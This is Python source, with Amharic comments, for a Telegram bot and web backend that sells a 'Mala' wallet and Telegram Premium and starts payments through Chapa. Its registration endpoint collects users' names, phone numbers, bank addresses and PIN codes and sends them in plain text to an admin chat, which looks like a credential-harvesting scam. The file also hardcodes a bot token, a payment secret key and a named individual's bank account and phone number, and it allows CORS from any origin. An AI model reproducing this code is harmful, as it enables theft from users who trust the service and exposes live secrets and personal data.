import asyncio
import logging
import os
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import WebAppInfo, InlineKeyboardMarkup, InlineKeyboardButton
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
import httpx

# የሰጧቸው ቶከኖች እና መረጃዎች
TOKEN = "8543715567:AAFPG7v8h-YJchs6aCYZ_Tad_35-iELISLw"
ADMIN_CHAT_ID = 5351353727
CHASECK_SECRET_KEY = "CHASECK-SncZN81Mx80yQcPiXJwRXDF6MdgchtNV"
WEB_APP_URL = "https://gashayeb-spec.github.io/mala-bot/index.html"

# የባንክ መረጃዎች
BANK_INFO = {
    "bank_name": "Commercial Bank of Ethiopia (CBE) / ብሔራዊ ባንክ",
    "account_number": "1000070780201",
    "account_name": "ጋሻዬ በጅጉ ሄሪጎ (Gashaye Bejigu Herigo)",
    "phone": "0916039015"
}

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher()

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🔐 የዋሌት ምዝገባ እና ቴሌግራም ፕሪሚየም", web_app=WebAppInfo(url=WEB_APP_URL))]
        ]
    )
    
    welcome_text = (
        "💡 **እንኳን ወደ ማላ (Mala) የዲጂታል ዎሌት እና ሰርቪስ በሰላም መጡ!**\n\n"
        "🏦 **የባንክ መረጃዎቻችን:**\n"
        f"• ባንክ: {BANK_INFO['bank_name']}\n"
        f"• ሂሳብ ቁጥር: `{BANK_INFO['account_number']}`\n"
        f"• ስም: {BANK_INFO['account_name']}\n\n"
        "🚀 **Telegram Premium እና ሌሎች አገልግሎቶችን ለማግኘት ከታች ያለውን በመጫን መጀመሪያ ዎሌትዎን ይመዝገቡ!**"
    )
    
    await message.answer(welcome_text, reply_markup=keyboard, parse_mode="Markdown")

@app.post("/api/register-and-pay")
async def register_and_pay(request: Request):
    try:
        data = await request.json()
        full_name = data.get("full_name", "")
        phone_number = data.get("phone_number", "")
        bank_address = data.get("bank_address", "")
        pin = data.get("pin", "")
        package_name = data.get("package", "1 ወር")
        amount = data.get("amount", 1399)
        recipient = data.get("recipient", "@username")
        telegram_id = data.get("telegram_id", 0)

        tx_ref = f"mala-wallet-{int(asyncio.get_event_loop().time())}"

        # ለአድሚን የሚላኩ የማረጋገጫ (Approve / Reject) ቁልፎች
        admin_keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="✅ አድሚን Approve አድርግ", callback_data=f"app_yes_{telegram_id}"),
                    InlineKeyboardButton(text="❌ Block / Cancel", callback_data=f"app_no_{telegram_id}")
                ]
            ]
        )

        # መረጃውን ለአድሚን መላክ
        try:
            await bot.send_message(
                ADMIN_CHAT_ID,
                f"🔔 **አዲስ የዎሌት ምዝገባ እና የግዢ ጥያቄ!**\n\n"
                f"👤 ስም: {full_name}\n"
                f"📞 ስልክ: {phone_number}\n"
                f"🏦 የባንክ አድራሻ: {bank_address}\n"
                f"🔐 ፒን ኮድ: {pin}\n"
                f"📦 የሚፈለግ ሰርቪስ: ቴሌግራም ፕሪሚየም ({package_name})\n"
                f"💰 ዋጋ: {amount} ETB\n"
                f"🎯 ተቀባይ ዩዘርነም: {recipient}\n"
                f"🆔 ቴሌግራም ID: {telegram_id}\n\n"
                f"እባክዎ መረጃውን አረጋግጦ ውሳኔ ይስጡ:",
                reply_markup=admin_keyboard
            )
        except Exception as e:
            logging.error(f"Admin notification error: {e}")

        # ቻፓ ክፍያ ማዘጋጀት
        payload = {
            "amount": str(amount),
            "currency": "ETB",
            "email": f"user_{telegram_id}@mala.et",
            "first_name": full_name.split(" ")[0] if " " in full_name else full_name,
            "last_name": full_name.split(" ")[1] if " " in full_name else "Bejigu",
            "phone_number": phone_number,
            "tx_ref": tx_ref,
            "callback_url": WEB_APP_URL,
            "return_url": WEB_APP_URL,
            "customization": {
                "title": "Mala Wallet & Telegram Premium",
                "description": f"Package: {package_name} | Recipient: {recipient}"
            }
        }

        headers = {
            "Authorization": f"Bearer {CHASECK_SECRET_KEY}",
            "Content-Type": "application/json"
        }

        async with httpx.AsyncClient() as client:
            response = await client.post("https://api.chapa.co/v1/transaction/initialize", json=payload, headers=headers)
            result = response.json()
            
            if response.status_code != 200 or result.get("status") != "success":
                return {"status": "failed", "message": result.get("message", "Chapa initialization failed")}

            return result

    except Exception as e:
        logging.error(f"API Error: {str(e)}")
        return {"status": "error", "message": str(e)}

@dp.callback_query(lambda c: c.data and c.data.startswith("app_"))
async def process_admin_approval(callback_query: types.CallbackQuery):
    action, _, tg_id = callback_query.data.split("_")
    
    if action == "yes":
        await bot.answer_callback_query(callback_query.id, text="ተጠቃሚው ጸድቋል (Approved)!")
        await callback_query.message.edit_text(callback_query.message.text + "\n\n✅ **ሁኔታ: ጸድቋል (Approved by Admin)**")
        # እዚህ ጋር ተጠቃሚው መጽደቁን ለተጠቃሚው ቦት በኩል መላክ ይቻላል
    else:
        await bot.answer_callback_query(callback_query.id, text="ጥያቄው ተሰርዟል (Blocked/Cancelled)!")
        await callback_query.message.edit_text(callback_query.message.text + "\n\n❌ **ሁኔታ: ተሰርዟል / ታግዷል (Cancelled/Blocked)**")

async def main():
    import uvicorn
    port = int(os.environ.get("PORT", 8080))
    config = uvicorn.Config(app, host="0.0.0.0", port=port, log_level="info")
    server = uvicorn.Server(config)
    
    await asyncio.gather(
        dp.start_polling(bot),
        server.serve()
    )

if __name__ == "__main__":
    main_loop = asyncio.get_event_loop()
    main_loop.run_until_complete(main())
